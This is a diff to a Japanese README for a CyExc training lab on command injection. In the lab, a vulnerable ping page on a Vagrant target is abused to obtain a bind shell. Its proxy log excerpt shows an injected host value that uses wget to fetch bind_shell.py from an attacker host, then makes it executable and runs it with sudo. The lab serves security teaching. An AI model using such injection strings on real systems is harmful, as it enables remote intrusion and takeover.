@@ -1,22 +1,21 @@
 # Command Injection脆弱性を利用した演習について
 ## Motivation
-攻撃者が外部入力を受け付けるようなWEBサイトに不正なOSコマンドを含むリクエストを送信すると、攻撃者により直接Target OSに対して予期しない危険なコマンドを実行される。現実社会で、Command Injectionからどのようにして情報漏洩が発生するかを理解することは重要である。
+攻撃者 (Attacker) がコマンドインジェクションの脆弱性を持った攻撃対象のウェブサイト (Target) に不正なOSコマンドを含むリクエストを送信すると、Target OSにおいてAttackerの送信したコマンドが実行される。コマンドインジェクションによる攻撃や情報漏洩が、現実社会においてどのように発生するかを理解することは重要である。
 
 ## 学習目標
-CyExcが提供する本演習では、学習者に対してのCommand Injectionの脅威を理解することを目的する。本演習では、Bind ShellスクリプトをTarget OSにアップロードし、Target OSのシェル制御を取得する。VagrantにTarget(WEBサイト)とAttackerの2つのゲストOSを構築した環境を提供する。Bind Shellスクリプトは倫理の観点から、ここでの公開はしないこととする。
+CyExcが提供する本演習では、コマンドインジェクションの脆弱性やそれに対しての攻撃手法や脅威の理解を目的とする。本演習では、Bind ShellスクリプトをTarget OSにアップロードし、Target OSのシェル制御を取得する。Vagrantに攻撃対象のサーバ (Target OS、ウェブサーバ、Apache Struts2を利用) と攻撃者が利用するサーバ (Attacker OS、ウェブサーバ) の2つのゲストOSを構築した環境を提供する。なお、Reverse Shellスクリプトは情報倫理の観点から、CyExcでの公開または提供は行わないものとする。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/block.png" title="Ex2演習環境構成図">
 
 ## Bind Shellとは
 Targetマシンのポートを開け、Attackerマシンから受信を待つシェルのことである。
 1. Attackerマシンから攻撃コードを送信する。
-2. 攻撃に成功した場合、Targetマシンのポートをオープンさせる。
-3. AttackerマシンからTargetマシンの待ち受けているポートに接続し、Targetマシンのシェルの制御が奪われる。
+2. 攻撃に成功した場合、TargetマシンからAttackerマシンで待ち受けているポートが開かれて接続され、Attackerマシン側にシェルの制御が奪われる。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/bindshell.png" title="BindShell">
 
 ## シナリオ
-Target OSに設置されたWEBサーバ は、入力されたホスト名またはIPアドレスに対してpingを行うサイトを公開している。Attacker OSからこのWEBサイトにアクセスし、不正なOSコマンドを含むリクエストを送信する。また、Bind Shellスクリプトを実行し、Target OSに設置されたWEBサーバのシェル制御を取得する。
+Target OSに設置されたウェブサーバ は、入力されたホスト名またはIPアドレスに対してpingを行うサイトを公開している。Attacker OSからこのウェブサイトにアクセスし、不正なOSコマンドを含むリクエストを送信する。また、Bind Shellスクリプトを実行し、Target OSに設置されたウェブサーバのシェル制御を取得する。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/network.png" title="ネットワーク図">
 
@@ -39,14 +38,14 @@ attacker.cyexc-attacker        192.168.33.20
 $ vagrant ssh target  <br>
 	i. $ cd target/　　　    <br>
 	ii.$ sudo docker-compose up --build  <br>
-	iii. Browse to http://target.cyexc-target/  <br>
+	iii. Browse to ht&#8203;tp://target.cyexc-target/  <br>
 4. attacker側のOS起動
 $ vagrant ssh attacker  <br>
 	i. $ cd attacker/　　　      <br>
 	ii.$ sudo docker-compose up --build  <br>
 
 ## nc (netcat)
-対象サーバとTCPまたはUDPで接続して、データ送受信するためのバックエンドツール。また、ポートスキャンツールやサービスデーモンとして特定ポートでListenさせることができる。  <br>
+対象サーバとTCPまたはUDPで接続して、データ送受信するためのバックエンドツール。また、ポートスキャンツールやサービスデーモンとして特定ポートでListenさせることができる。
 ```
 usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
 	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
@@ -113,13 +112,16 @@ Connection: close
 Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。  <br>
 以下はBind ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。  <br>
 
+* ncを使用した場合
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/nc.png" title="ncスクリーンショット">
+
+* telnetを使用した場合
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/telnet.png" title="telnetスクリーンショット">
 
 ### proxyサーバログの検知
 vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log<br>
 
-[20/Jan/2018:14:09:20 +0000] **"GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1"** 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
+[20/Jan/2018:14:09:20 +0000] **"GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1"** 200 842 **"ht&#8203;tp://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py"** "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
 
 URLエンコードすると、不正なOSコマンドを含むリクエストがわかる。
 ```
